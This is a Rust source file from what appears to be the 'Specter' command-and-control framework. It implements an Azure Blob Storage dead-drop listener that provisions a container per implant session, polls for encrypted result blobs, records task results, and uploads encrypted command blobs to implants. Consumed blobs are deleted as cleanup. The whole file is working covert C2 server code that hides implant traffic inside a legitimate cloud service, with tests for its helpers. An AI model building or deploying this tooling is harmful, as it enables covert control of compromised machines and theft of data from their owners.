//! Azure Blob Storage Dead Drop Listener
//!
//! Polls Azure Blob Storage containers for implant result blobs,
//! downloads/decrypts/processes them, writes command blobs with tasks,
//! and cleans up consumed blobs.  Each implant gets its own container
//! (`session-{id}`) with a scoped SAS token.

use std::sync::Arc;

use chacha20poly1305::aead::{Aead, KeyInit};
use chacha20poly1305::{ChaCha20Poly1305, Nonce};
use chrono::Utc;
use serde::{Deserialize, Serialize};
use sqlx::{Row, SqlitePool};
use thiserror::Error;
use tokio::sync::Mutex;
use tokio::time::{self, Duration};

use crate::event::{EventBus, SpecterEvent};
use crate::session::SessionManager;
use crate::task::TaskDispatcher;

// ── Error type ──────────────────────────────────────────────────────────

#[derive(Debug, Error)]
pub enum AzureListenerError {
    #[error("database error: {0}")]
    Database(#[from] sqlx::Error),
    #[error("HTTP error: {0}")]
    Http(String),
    #[error("encryption error: {0}")]
    Encryption(String),
    #[error("container not found: {0}")]
    ContainerNotFound(String),
    #[error("invalid configuration: {0}")]
    InvalidConfig(String),
    #[error("blob parse error: {0}")]
    BlobParse(String),
}

// ── Configuration ───────────────────────────────────────────────────────

/// Configuration for an Azure dead drop listener instance.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AzureListenerConfig {
    /// Unique listener identifier
    pub id: String,
    /// Human-readable name
    pub name: String,
    /// Azure Storage account name
    pub account_name: String,
    /// Account-level SAS token (for container provisioning)
    pub account_sas_token: String,
    /// Poll interval in seconds
    #[serde(default = "default_poll_interval")]
    pub poll_interval_secs: u64,
    /// Maximum age of blobs before cleanup (seconds)
    #[serde(default = "default_max_blob_age")]
    pub max_blob_age_secs: u64,
    /// Session encryption key (hex-encoded, 32 bytes)
    pub encryption_key_hex: String,
}

fn default_poll_interval() -> u64 {
    10
}

fn default_max_blob_age() -> u64 {
    3600
}

/// Per-container state for an implant session.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AzureContainer {
    /// Session ID (maps to sessions table)
    pub session_id: String,
    /// Container name (e.g., "session-abc123")
    pub container_name: String,
    /// Per-container SAS token (scoped to this container only)
    pub sas_token: String,
    /// Encryption key for this session (hex, 32 bytes)
    pub encryption_key_hex: String,
    /// Next command sequence number to write
    pub next_cmd_seq: u32,
    /// Next result sequence number expected from implant
    pub next_result_seq: u32,
    /// Whether container has been provisioned in Azure
    pub provisioned: bool,
    /// Timestamp of creation
    pub created_at: i64,
}

/// Status of the Azure listener.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum AzureListenerStatus {
    Running,
    Stopped,
}

// ── Blob naming helpers ─────────────────────────────────────────────────

/// Format a command blob name: `command-000005`
pub fn command_blob_name(seq: u32) -> String {
    format!("command-{seq:06}")
}

/// Format a result blob name: `result-000005`
pub fn result_blob_name(seq: u32) -> String {
    format!("result-{seq:06}")
}

/// Parse sequence number from a blob name like `result-000005`.
pub fn parse_blob_seq(name: &str, prefix: &str) -> Option<u32> {
    name.strip_prefix(prefix)
        .and_then(|s| s.parse::<u32>().ok())
}

// ── SAS URL construction ────────────────────────────────────────────────

/// Build a full Azure Blob Storage URL for a specific blob.
pub fn build_blob_url(account: &str, container: &str, blob: &str, sas_token: &str) -> String {
    format!("https://{account}.blob.core.windows.net/{container}/{blob}?{sas_token}")
}

/// Build a list blobs URL with optional prefix filter.
pub fn build_list_url(
    account: &str,
    container: &str,
    prefix: Option<&str>,
    sas_token: &str,
) -> String {
    let prefix_param = prefix.map(|p| format!("&prefix={p}")).unwrap_or_default();
    format!(
        "https://{account}.blob.core.windows.net/{container}?restype=container&comp=list{prefix_param}&{sas_token}"
    )
}

/// Build a container creation URL.
pub fn build_create_container_url(account: &str, container: &str, sas_token: &str) -> String {
    format!("https://{account}.blob.core.windows.net/{container}?restype=container&{sas_token}")
}

// ── Encryption helpers ──────────────────────────────────────────────────

/// Encrypt data for upload: returns `[12-byte nonce][ciphertext+tag]`.
pub fn encrypt_blob(key: &[u8; 32], plaintext: &[u8]) -> Result<Vec<u8>, AzureListenerError> {
    let cipher = ChaCha20Poly1305::new_from_slice(key)
        .map_err(|e| AzureListenerError::Encryption(e.to_string()))?;

    let nonce_bytes: [u8; 12] = rand::random();
    let nonce = Nonce::from_slice(&nonce_bytes);

    let ciphertext = cipher
        .encrypt(nonce, plaintext)
        .map_err(|e| AzureListenerError::Encryption(e.to_string()))?;

    let mut output = Vec::with_capacity(12 + ciphertext.len());
    output.extend_from_slice(&nonce_bytes);
    output.extend_from_slice(&ciphertext);
    Ok(output)
}

/// Decrypt blob data: expects `[12-byte nonce][ciphertext+tag]`.
pub fn decrypt_blob(key: &[u8; 32], data: &[u8]) -> Result<Vec<u8>, AzureListenerError> {
    if data.len() < 12 + 16 {
        return Err(AzureListenerError::Encryption(
            "blob too short for nonce+tag".to_string(),
        ));
    }

    let nonce = Nonce::from_slice(&data[..12]);
    let ciphertext = &data[12..];

    let cipher = ChaCha20Poly1305::new_from_slice(key)
        .map_err(|e| AzureListenerError::Encryption(e.to_string()))?;

    cipher
        .decrypt(nonce, ciphertext)
        .map_err(|e| AzureListenerError::Encryption(e.to_string()))
}

/// Parse hex-encoded key into a 32-byte array.
pub fn parse_key_hex(hex_str: &str) -> Result<[u8; 32], AzureListenerError> {
    let bytes = hex::decode(hex_str)
        .map_err(|e| AzureListenerError::InvalidConfig(format!("invalid hex key: {e}")))?;
    if bytes.len() != 32 {
        return Err(AzureListenerError::InvalidConfig(format!(
            "key must be 32 bytes, got {}",
            bytes.len()
        )));
    }
    let mut key = [0u8; 32];
    key.copy_from_slice(&bytes);
    Ok(key)
}

// ── Azure Listener Manager ─────────────────────────────────────────────

pub struct AzureListenerManager {
    pool: SqlitePool,
    session_manager: Arc<SessionManager>,
    task_dispatcher: Arc<TaskDispatcher>,
    event_bus: Arc<EventBus>,
    http_client: reqwest::Client,
    active_pollers: Mutex<Vec<(String, tokio::sync::oneshot::Sender<()>)>>,
}

impl AzureListenerManager {
    pub fn new(
        pool: SqlitePool,
        session_manager: Arc<SessionManager>,
        task_dispatcher: Arc<TaskDispatcher>,
        event_bus: Arc<EventBus>,
    ) -> Self {
        let http_client = reqwest::Client::builder()
            .timeout(Duration::from_secs(30))
            .build()
            .unwrap_or_default();

        Self {
            pool,
            session_manager,
            task_dispatcher,
            event_bus,
            http_client,
            active_pollers: Mutex::new(Vec::new()),
        }
    }

    /// Create a new Azure listener configuration and store in DB.
    pub async fn create_listener(
        &self,
        config: &AzureListenerConfig,
    ) -> Result<AzureListenerConfig, AzureListenerError> {
        let now = Utc::now().timestamp();
        let config_json = serde_json::to_string(config)
            .map_err(|e| AzureListenerError::InvalidConfig(e.to_string()))?;

        sqlx::query(
            "INSERT INTO azure_listeners (id, name, config_json, status, created_at, updated_at) \
             VALUES (?1, ?2, ?3, 'STOPPED', ?4, ?5)",
        )
        .bind(&config.id)
        .bind(&config.name)
        .bind(&config_json)
        .bind(now)
        .bind(now)
        .execute(&self.pool)
        .await?;

        self.event_bus.publish(SpecterEvent::Generic {
            message: format!("Azure listener '{}' created", config.name),
        });

        Ok(config.clone())
    }

    /// Start polling an Azure listener.
    pub async fn start_listener(&self, id: &str) -> Result<(), AzureListenerError> {
        let config = self.get_listener_config(id).await?;

        let (shutdown_tx, shutdown_rx) = tokio::sync::oneshot::channel::<()>();

        let pool = self.pool.clone();
        let session_manager = Arc::clone(&self.session_manager);
        let task_dispatcher = Arc::clone(&self.task_dispatcher);
        let event_bus = Arc::clone(&self.event_bus);
        let http_client = self.http_client.clone();
        let poll_interval = Duration::from_secs(config.poll_interval_secs);

        tokio::spawn(async move {
            let mut shutdown = shutdown_rx;
            let mut interval = time::interval(poll_interval);

            loop {
                tokio::select! {
                    _ = interval.tick() => {
                        if let Err(e) = poll_containers(
                            &pool,
                            &config,
                            &http_client,
                            &session_manager,
                            &task_dispatcher,
                            &event_bus,
                        )
                        .await
                        {
                            tracing::warn!("Azure poll error: {e}");
                        }
                    }
                    _ = &mut shutdown => {
                        tracing::info!("Azure listener {} shutting down", config.id);
                        break;
                    }
                }
            }
        });

        let _ = sqlx::query(
            "UPDATE azure_listeners SET status = 'RUNNING', updated_at = ?1 WHERE id = ?2",
        )
        .bind(Utc::now().timestamp())
        .bind(id)
        .execute(&self.pool)
        .await;

        self.active_pollers
            .lock()
            .await
            .push((id.to_string(), shutdown_tx));

        self.event_bus.publish(SpecterEvent::Generic {
            message: format!("Azure listener {id} started"),
        });

        Ok(())
    }

    /// Stop an Azure listener.
    pub async fn stop_listener(&self, id: &str) -> Result<(), AzureListenerError> {
        let mut pollers = self.active_pollers.lock().await;
        if let Some(pos) = pollers.iter().position(|(pid, _)| pid == id) {
            let (_, tx) = pollers.remove(pos);
            let _ = tx.send(());
        }

        let _ = sqlx::query(
            "UPDATE azure_listeners SET status = 'STOPPED', updated_at = ?1 WHERE id = ?2",
        )
        .bind(Utc::now().timestamp())
        .bind(id)
        .execute(&self.pool)
        .await;

        self.event_bus.publish(SpecterEvent::Generic {
            message: format!("Azure listener {id} stopped"),
        });

        Ok(())
    }

    /// Provision a new container for an implant session.
    pub async fn provision_container(
        &self,
        listener_id: &str,
        session_id: &str,
        encryption_key_hex: &str,
        sas_token: &str,
    ) -> Result<AzureContainer, AzureListenerError> {
        let config = self.get_listener_config(listener_id).await?;
        let container_name = format!("session-{session_id}");
        let now = Utc::now().timestamp();

        // Create container in Azure
        let url = build_create_container_url(
            &config.account_name,
            &container_name,
            &config.account_sas_token,
        );

        let resp = self
            .http_client
            .put(&url)
            .header("x-ms-version", "2020-10-02")
            .header("Content-Length", "0")
            .send()
            .await
            .map_err(|e| AzureListenerError::Http(e.to_string()))?;

        let status = resp.status().as_u16();
        // 201 = created, 409 = already exists (both OK)
        if status != 201 && status != 409 {
            return Err(AzureListenerError::Http(format!(
                "container creation failed with status {status}"
            )));
        }

        let container = AzureContainer {
            session_id: session_id.to_string(),
            container_name: container_name.clone(),
            sas_token: sas_token.to_string(),
            encryption_key_hex: encryption_key_hex.to_string(),
            next_cmd_seq: 0,
            next_result_seq: 0,
            provisioned: true,
            created_at: now,
        };

        sqlx::query(
            "INSERT INTO azure_containers (session_id, listener_id, container_name, sas_token, encryption_key_hex, next_cmd_seq, next_result_seq, provisioned, created_at) \
             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9)",
        )
        .bind(&container.session_id)
        .bind(listener_id)
        .bind(&container.container_name)
        .bind(&container.sas_token)
        .bind(&container.encryption_key_hex)
        .bind(container.next_cmd_seq as i64)
        .bind(container.next_result_seq as i64)
        .bind(container.provisioned)
        .bind(container.created_at)
        .execute(&self.pool)
        .await?;

        self.event_bus.publish(SpecterEvent::Generic {
            message: format!(
                "Azure container '{container_name}' provisioned for session {session_id}"
            ),
        });

        Ok(container)
    }

    /// List all containers managed by a listener.
    pub async fn list_containers(
        &self,
        listener_id: &str,
    ) -> Result<Vec<AzureContainer>, AzureListenerError> {
        let rows = sqlx::query(
            "SELECT session_id, container_name, sas_token, encryption_key_hex, \
                    next_cmd_seq, next_result_seq, provisioned, created_at \
             FROM azure_containers WHERE listener_id = ?1 ORDER BY created_at DESC",
        )
        .bind(listener_id)
        .fetch_all(&self.pool)
        .await?;

        Ok(rows.iter().map(row_to_container).collect())
    }

    /// Rotate the SAS token for a container (e.g., on expiry).
    pub async fn rotate_sas_token(
        &self,
        session_id: &str,
        new_sas_token: &str,
    ) -> Result<(), AzureListenerError> {
        let now = Utc::now().timestamp();
        let result =
            sqlx::query("UPDATE azure_containers SET sas_token = ?1 WHERE session_id = ?2")
                .bind(new_sas_token)
                .bind(session_id)
                .execute(&self.pool)
                .await?;

        if result.rows_affected() == 0 {
            return Err(AzureListenerError::ContainerNotFound(
                session_id.to_string(),
            ));
        }

        let _ = now; // suppress unused

        Ok(())
    }

    /// List all Azure listeners.
    pub async fn list_listeners(
        &self,
    ) -> Result<Vec<(AzureListenerConfig, AzureListenerStatus)>, AzureListenerError> {
        let rows =
            sqlx::query("SELECT config_json, status FROM azure_listeners ORDER BY created_at DESC")
                .fetch_all(&self.pool)
                .await?;

        let mut results = Vec::with_capacity(rows.len());
        for row in &rows {
            let config_json: String = row.get("config_json");
            let status_str: String = row.get("status");

            let config: AzureListenerConfig = serde_json::from_str(&config_json)
                .map_err(|e| AzureListenerError::InvalidConfig(e.to_string()))?;
            let status = match status_str.as_str() {
                "RUNNING" => AzureListenerStatus::Running,
                _ => AzureListenerStatus::Stopped,
            };
            results.push((config, status));
        }

        Ok(results)
    }

    // ── Internal ────────────────────────────────────────────────────

    async fn get_listener_config(
        &self,
        id: &str,
    ) -> Result<AzureListenerConfig, AzureListenerError> {
        let row = sqlx::query("SELECT config_json FROM azure_listeners WHERE id = ?1")
            .bind(id)
            .fetch_optional(&self.pool)
            .await?
            .ok_or_else(|| {
                AzureListenerError::InvalidConfig(format!("listener not found: {id}"))
            })?;

        let config_json: String = row.get("config_json");
        serde_json::from_str(&config_json)
            .map_err(|e| AzureListenerError::InvalidConfig(e.to_string()))
    }
}

// ── Polling logic ───────────────────────────────────────────────────────

/// Poll all containers for a listener: check for result blobs, process them,
/// write command blobs with pending tasks.
async fn poll_containers(
    pool: &SqlitePool,
    config: &AzureListenerConfig,
    http_client: &reqwest::Client,
    session_manager: &SessionManager,
    task_dispatcher: &TaskDispatcher,
    event_bus: &EventBus,
) -> Result<(), AzureListenerError> {
    let rows = sqlx::query(
        "SELECT session_id, container_name, sas_token, encryption_key_hex, \
                next_cmd_seq, next_result_seq, provisioned, created_at \
         FROM azure_containers WHERE listener_id = ?1 AND provisioned = 1",
    )
    .bind(&config.id)
    .fetch_all(pool)
    .await?;

    for row in &rows {
        let container = row_to_container(row);
        let listener_id: String = config.id.clone();

        if let Err(e) = poll_single_container(
            pool,
            config,
            &container,
            &listener_id,
            http_client,
            session_manager,
            task_dispatcher,
            event_bus,
        )
        .await
        {
            tracing::warn!(
                "Azure poll error for container {}: {e}",
                container.container_name
            );
        }
    }

    Ok(())
}

/// Poll a single container: download result blobs, process check-ins,
/// upload command blobs with pending tasks.
#[allow(clippy::too_many_arguments)]
async fn poll_single_container(
    pool: &SqlitePool,
    config: &AzureListenerConfig,
    container: &AzureContainer,
    _listener_id: &str,
    http_client: &reqwest::Client,
    session_manager: &SessionManager,
    task_dispatcher: &TaskDispatcher,
    event_bus: &EventBus,
) -> Result<(), AzureListenerError> {
    let key = parse_key_hex(&container.encryption_key_hex)?;

    // 1. List result blobs
    let list_url = build_list_url(
        &config.account_name,
        &container.container_name,
        Some("result-"),
        &container.sas_token,
    );

    let resp = http_client
        .get(&list_url)
        .header("x-ms-version", "2020-10-02")
        .send()
        .await
        .map_err(|e| AzureListenerError::Http(e.to_string()))?;

    if !resp.status().is_success() {
        return Err(AzureListenerError::Http(format!(
            "list blobs returned {}",
            resp.status()
        )));
    }

    let body = resp
        .text()
        .await
        .map_err(|e| AzureListenerError::Http(e.to_string()))?;

    // Parse blob names from XML
    let blob_names = parse_blob_names_xml(&body);

    let mut next_result_seq = container.next_result_seq;

    // 2. Process each result blob in sequence order
    for name in &blob_names {
        if let Some(seq) = parse_blob_seq(name, "result-") {
            if seq < next_result_seq {
                // Already processed — delete stale blob
                let del_url = build_blob_url(
                    &config.account_name,
                    &container.container_name,
                    name,
                    &container.sas_token,
                );
                let _ = http_client
                    .delete(&del_url)
                    .header("x-ms-version", "2020-10-02")
                    .send()
                    .await;
                continue;
            }

            // Download blob
            let blob_url = build_blob_url(
                &config.account_name,
                &container.container_name,
                name,
                &container.sas_token,
            );

            let blob_resp = http_client
                .get(&blob_url)
                .header("x-ms-version", "2020-10-02")
                .send()
                .await
                .map_err(|e| AzureListenerError::Http(e.to_string()))?;

            if !blob_resp.status().is_success() {
                continue;
            }

            let blob_data = blob_resp
                .bytes()
                .await
                .map_err(|e| AzureListenerError::Http(e.to_string()))?;

            // Decrypt
            let plaintext = match decrypt_blob(&key, &blob_data) {
                Ok(pt) => pt,
                Err(e) => {
                    tracing::warn!("Failed to decrypt blob {name}: {e}");
                    continue;
                }
            };

            // Process result: parse as JSON check-in result
            if let Ok(result) = serde_json::from_slice::<serde_json::Value>(&plaintext) {
                // Process task results if present
                if let Some(task_results) = result.get("task_results").and_then(|v| v.as_array()) {
                    for tr in task_results {
                        let task_id = tr.get("task_id").and_then(|v| v.as_str()).unwrap_or("");
                        let status_str = tr.get("status").and_then(|v| v.as_str()).unwrap_or("");
                        let result_data = tr.get("result").and_then(|v| v.as_str()).unwrap_or("");
                        let success = status_str == "COMPLETE";
                        let _ = task_dispatcher
                            .complete_task(task_id, result_data.as_bytes(), success)
                            .await;
                    }
                }

                // Update session last check-in
                let _ = session_manager.update_checkin(&container.session_id).await;
            }

            next_result_seq = seq + 1;

            // Delete consumed result blob
            let del_url = build_blob_url(
                &config.account_name,
                &container.container_name,
                name,
                &container.sas_token,
            );
            let _ = http_client
                .delete(&del_url)
                .header("x-ms-version", "2020-10-02")
                .send()
                .await;
        }
    }

    // 3. Check for pending tasks and upload as command blobs
    let pending = task_dispatcher
        .get_pending_tasks(&container.session_id)
        .await
        .unwrap_or_default();

    let mut next_cmd_seq = container.next_cmd_seq;

    if !pending.is_empty() {
        let mut tasks_payload = Vec::new();
        for t in &pending {
            let _ = task_dispatcher.mark_dispatched(&t.id).await;
            tasks_payload.push(serde_json::json!({
                "task_id": t.id,
                "task_type": t.task_type,
                "arguments": String::from_utf8_lossy(&t.arguments),
            }));
        }

        let cmd_json = serde_json::json!({
            "session_id": container.session_id,
            "tasks": tasks_payload,
        });
        let cmd_bytes = serde_json::to_vec(&cmd_json).unwrap_or_default();

        // Encrypt and upload
        let encrypted = encrypt_blob(&key, &cmd_bytes)?;
        let blob_name = command_blob_name(next_cmd_seq);
        let put_url = build_blob_url(
            &config.account_name,
            &container.container_name,
            &blob_name,
            &container.sas_token,
        );

        let resp = http_client
            .put(&put_url)
            .header("x-ms-version", "2020-10-02")
            .header("x-ms-blob-type", "BlockBlob")
            .header("Content-Type", "application/octet-stream")
            .body(encrypted)
            .send()
            .await
            .map_err(|e| AzureListenerError::Http(e.to_string()))?;

        if resp.status().as_u16() == 201 {
            next_cmd_seq += 1;

            event_bus.publish(SpecterEvent::Generic {
                message: format!(
                    "Azure: dispatched {} tasks to session {}",
                    pending.len(),
                    container.session_id
                ),
            });
        }
    }

    // 4. Update sequence numbers in DB
    if next_result_seq != container.next_result_seq || next_cmd_seq != container.next_cmd_seq {
        let _ = sqlx::query(
            "UPDATE azure_containers SET next_result_seq = ?1, next_cmd_seq = ?2 WHERE session_id = ?3",
        )
        .bind(next_result_seq as i64)
        .bind(next_cmd_seq as i64)
        .bind(&container.session_id)
        .execute(pool)
        .await;
    }

    Ok(())
}

// ── XML parsing helper ──────────────────────────────────────────────────

/// Parse blob names from Azure List Blobs XML response.
/// Extracts `<Name>...</Name>` values from `<Blob>` elements.
pub fn parse_blob_names_xml(xml: &str) -> Vec<String> {
    let mut names = Vec::new();
    let mut pos = 0;
    let bytes = xml.as_bytes();

    while pos < bytes.len() {
        // Find <Name>
        if let Some(start) = xml[pos..].find("<Name>") {
            let name_start = pos + start + 6;
            if let Some(end) = xml[name_start..].find("</Name>") {
                let name = &xml[name_start..name_start + end];
                names.push(name.to_string());
                pos = name_start + end + 7;
            } else {
                break;
            }
        } else {
            break;
        }
    }

    names
}

// ── DB row mapper ───────────────────────────────────────────────────────

fn row_to_container(row: &sqlx::sqlite::SqliteRow) -> AzureContainer {
    let next_cmd_seq: i64 = row.get("next_cmd_seq");
    let next_result_seq: i64 = row.get("next_result_seq");
    let provisioned: bool = row.get("provisioned");
    let created_at: i64 = row.get("created_at");

    AzureContainer {
        session_id: row.get("session_id"),
        container_name: row.get("container_name"),
        sas_token: row.get("sas_token"),
        encryption_key_hex: row.get("encryption_key_hex"),
        next_cmd_seq: next_cmd_seq as u32,
        next_result_seq: next_result_seq as u32,
        provisioned,
        created_at,
    }
}

// ── Tests ───────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_command_blob_name() {
        assert_eq!(command_blob_name(0), "command-000000");
        assert_eq!(command_blob_name(5), "command-000005");
        assert_eq!(command_blob_name(123), "command-000123");
        assert_eq!(command_blob_name(999999), "command-999999");
    }

    #[test]
    fn test_result_blob_name() {
        assert_eq!(result_blob_name(0), "result-000000");
        assert_eq!(result_blob_name(42), "result-000042");
    }

    #[test]
    fn test_parse_blob_seq() {
        assert_eq!(parse_blob_seq("result-000005", "result-"), Some(5));
        assert_eq!(parse_blob_seq("command-000123", "command-"), Some(123));
        assert_eq!(parse_blob_seq("result-000000", "result-"), Some(0));
        assert_eq!(parse_blob_seq("other-000005", "result-"), None);
        assert_eq!(parse_blob_seq("result-abc", "result-"), None);
    }

    #[test]
    fn test_build_blob_url() {
        let url = build_blob_url(
            "myaccount",
            "session-abc",
            "result-000001",
            "sv=2020-10-02&sig=xxx",
        );
        assert_eq!(
            url,
            "https://myaccount.blob.core.windows.net/session-abc/result-000001?sv=2020-10-02&sig=xxx"
        );
    }

    #[test]
    fn test_build_list_url() {
        let url = build_list_url(
            "myaccount",
            "session-abc",
            Some("result-"),
            "sv=2020-10-02&sig=xxx",
        );
        assert!(url.contains("restype=container&comp=list"));
        assert!(url.contains("&prefix=result-"));
        assert!(url.contains("sv=2020-10-02&sig=xxx"));
    }

    #[test]
    fn test_build_list_url_no_prefix() {
        let url = build_list_url("myaccount", "session-abc", None, "sv=2020-10-02&sig=xxx");
        assert!(!url.contains("prefix="));
    }

    #[test]
    fn test_encryption_roundtrip() {
        let key: [u8; 32] = rand::random();
        let plaintext = b"hello from specter";

        let encrypted = encrypt_blob(&key, plaintext).expect("encrypt");
        assert!(encrypted.len() > plaintext.len());

        let decrypted = decrypt_blob(&key, &encrypted).expect("decrypt");
        assert_eq!(decrypted, plaintext);
    }

    #[test]
    fn test_decrypt_too_short() {
        let key: [u8; 32] = rand::random();
        let result = decrypt_blob(&key, &[0u8; 10]);
        assert!(result.is_err());
    }

    #[test]
    fn test_decrypt_wrong_key() {
        let key1: [u8; 32] = rand::random();
        let key2: [u8; 32] = rand::random();
        let plaintext = b"secret data";

        let encrypted = encrypt_blob(&key1, plaintext).expect("encrypt");
        let result = decrypt_blob(&key2, &encrypted);
        assert!(result.is_err());
    }

    #[test]
    fn test_parse_key_hex() {
        let key_hex = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
        let key = parse_key_hex(key_hex).expect("parse");
        assert_eq!(key.len(), 32);

        // Too short
        assert!(parse_key_hex("0123").is_err());
        // Invalid hex
        assert!(parse_key_hex("zzzz").is_err());
    }

    #[test]
    fn test_parse_blob_names_xml() {
        let xml = r#"<?xml version="1.0" encoding="utf-8"?>
<EnumerationResults>
  <Blobs>
    <Blob><Name>result-000001</Name><Properties /></Blob>
    <Blob><Name>result-000002</Name><Properties /></Blob>
    <Blob><Name>metadata</Name><Properties /></Blob>
  </Blobs>
</EnumerationResults>"#;

        let names = parse_blob_names_xml(xml);
        assert_eq!(names.len(), 3);
        assert_eq!(names[0], "result-000001");
        assert_eq!(names[1], "result-000002");
        assert_eq!(names[2], "metadata");
    }

    #[test]
    fn test_parse_blob_names_xml_empty() {
        let xml =
            r#"<?xml version="1.0"?><EnumerationResults><Blobs></Blobs></EnumerationResults>"#;
        let names = parse_blob_names_xml(xml);
        assert!(names.is_empty());
    }

    #[test]
    fn test_build_create_container_url() {
        let url = build_create_container_url("myaccount", "session-abc", "sv=2020-10-02&sig=xxx");
        assert_eq!(
            url,
            "https://myaccount.blob.core.windows.net/session-abc?restype=container&sv=2020-10-02&sig=xxx"
        );
    }

    #[tokio::test]
    async fn test_azure_listener_manager_create() {
        let pool = SqlitePool::connect("sqlite::memory:")
            .await
            .expect("connect");
        crate::db::migrations::run_migrations(&pool)
            .await
            .expect("migrations");

        let event_bus = Arc::new(EventBus::new(64));
        let session_manager = Arc::new(SessionManager::new(pool.clone(), event_bus.clone()));
        let task_dispatcher = Arc::new(TaskDispatcher::new(pool.clone(), event_bus.clone()));

        let manager = AzureListenerManager::new(pool, session_manager, task_dispatcher, event_bus);

        let config = AzureListenerConfig {
            id: "azure-1".to_string(),
            name: "test-azure".to_string(),
            account_name: "specterstorage".to_string(),
            account_sas_token: "sv=2020-10-02&sig=test".to_string(),
            poll_interval_secs: 10,
            max_blob_age_secs: 3600,
            encryption_key_hex: "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
                .to_string(),
        };

        let result = manager.create_listener(&config).await;
        assert!(result.is_ok());

        let listeners = manager.list_listeners().await.expect("list");
        assert_eq!(listeners.len(), 1);
        assert_eq!(listeners[0].0.name, "test-azure");
        assert_eq!(listeners[0].1, AzureListenerStatus::Stopped);
    }
}
